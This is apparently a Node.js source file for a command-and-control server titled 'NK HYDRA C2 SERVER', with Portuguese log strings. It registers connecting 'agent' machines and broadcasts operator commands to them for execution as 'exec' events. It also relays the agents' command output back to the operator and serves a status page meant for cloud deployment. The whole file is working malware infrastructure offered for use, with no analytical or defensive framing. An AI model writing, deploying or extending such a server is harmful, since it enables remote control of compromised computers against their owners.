/* NK HYDRA C2 SERVER v31.0 */
/* SINGULARITY HIVE PROTOCOL */
/* COMMAND: node server.js */

const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const cors = require('cors');

const app = express();
app.use(cors());

// --- CRITICAL: ROOT ROUTE FOR RENDER DEPLOYMENT ---
app.get('/', (req, res) => {
    res.status(200).send(`
        <html>
            <body style="background-color: #050505; color: #00ff41; font-family: monospace; display: flex; align-items: center; justify-content: center; height: 100vh;">
                <div style="text-align: center; border: 1px solid #00ff41; padding: 2rem;">
                    <h1>NK HYDRA C2 SERVER v31.0</h1>
                    <h2 style="color: white;">STATUS: <span style="color: #00ff41; animation: blink 1s infinite;">ONLINE</span></h2>
                    <p>HIVE UPLINK ACTIVE</p>
                </div>
                <style>@keyframes blink { 50% { opacity: 0; } }</style>
            </body>
        </html>
    `);
});

const server = http.createServer(app);
const io = new Server(server, { 
    cors: { origin: "*" },
    pingTimeout: 60000,
    transports: ['websocket', 'polling']
}); 

console.log("[*] INICIANDO SISTEMA C2...");

io.on('connection', (socket) => {
    
    // Log connection attempt
    // console.log(`[DEBUG] Nova conexao socket: ${socket.id}`);

    socket.on('identify', (data) => {
        if (data.type === 'agent') {
            const msg = `AGENT CONNECTED: ${data.id} [${data.os}]`;
            console.log(`[+] ${msg}`);
            io.emit('log', `[SYSTEM] ${msg}`);
            // Add simple keep-alive logic or db tracking here
            io.emit('status', { agents: [{ id: data.id, status: 'ONLINE', ip: 'REMOTE', os: data.os }] });
        }
    });

    socket.on('cmd', (data) => {
        console.log(`[CMD RELAY] ${data.cmd}`);
        io.emit('exec', data); 
        io.emit('log', `[C2] WARLORD COMMAND: ${data.cmd}`);
    });

    socket.on('stream_log', (data) => {
        console.log(`[${data.from}] ${data.output}`);
        io.emit('log', data);
    });
    
    socket.on('disconnect', () => {
        // console.log(`[DEBUG] Socket desconectado: ${socket.id}`);
    });
});

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => {
    console.log(`[+] SERVIDOR RODANDO NA PORTA ${PORT}`);
    console.log(`[+] ACESSE VIA BROWSER PARA VERIFICAR STATUS.`);
});
    